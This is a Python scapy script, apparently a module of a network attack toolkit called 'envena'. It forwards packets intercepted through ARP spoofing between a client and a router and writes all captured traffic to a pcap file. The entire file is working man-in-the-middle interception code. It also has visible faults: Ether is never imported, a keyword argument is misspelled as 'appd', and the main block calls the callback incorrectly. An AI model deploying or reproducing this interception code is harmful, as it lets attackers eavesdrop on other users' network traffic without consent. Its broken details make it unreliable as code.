import scapy.all as scapy
from scapy.all import IP
from scapy.all import PcapWriter, sniff
from datetime import datetime

import sys, os
sys.path.append(os.path.join('..'))

from config import *

ip_dst=''
mac_dst=''

def addr_spoof(packet, iface: str=scapy.conf.iface)->None:
    global ip_dst
    global mac_dst
    global ip_src
    global mac_src
    
    # Client to router:
    if packet[IP].dst == ip_dst and packet[Ether].dst == scapy.get_if_hwaddr(iface):
        print(f'[1] {packet[IP].src}:{packet[Ether].src} -> {packet[IP].dst}:{packet[Ether].dst}')
        packet[Ether].dst = mac_dst
        scapy.sendp(packet, iface=iface, verbose=False)
        print(f'[2] {packet[IP].src}:{packet[Ether].src} -> {packet[IP].dst}:{packet[Ether].dst}\n')
        
    # Router to client:
    elif packet[IP].dst == ip_src and packet[Ether].dst == scapy.get_if_hwaddr(iface):
        print(f'[1] {packet[IP].src}:{packet[Ether].src} -> {packet[IP].dst}:{packet[Ether].dst}')
        packet[Ether].dst = mac_src
        scapy.sendp(packet, iface=iface, verbose=False)
        print(f'[2] {packet[IP].src}:{packet[Ether].src} -> {packet[IP].dst}:{packet[Ether].dst}')
        # scapy.hexdump(packet)
        
    

def ip_forward(args):
    print('IP Forwarding, version: 1.0')
    print('*IP Forwarding started. Ctrl+C to stop')
    global ip_dst
    global mac_dst
    global ip_src
    global mac_src
    ip_dst = args['ip_dst']
    mac_dst = args['mac_dst']
    ip_src = args['ip_src']
    mac_src = args['mac_src']
    now = datetime.now()
    
    filename = f'captured/envena_ip_forwarding_{now}.pcap'
    try:
        filename = f'captured/envena_ip_forwarding_{now}.pcap'
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    except FileNotFoundError:
        filename = f'envena_ip_forwarding_{now}.pcap'
        pcap_writer = PcapWriter(filename=filename, appd=False, sync=True)
    arpspoof_packets = sniff(filter='ip', prn=addr_spoof, store=True, iface=args['iface'])
    pcap_writer.write(arpspoof_packets)
    print(f'\n{Success}Traffic was writted in \'{filename}\'{Clear}')
 

if __name__ == '__main__':
    arpspoof_packets = sniff(filter='ip', prn=addr_spoof(), store=True)
    print(arpspoof_packets)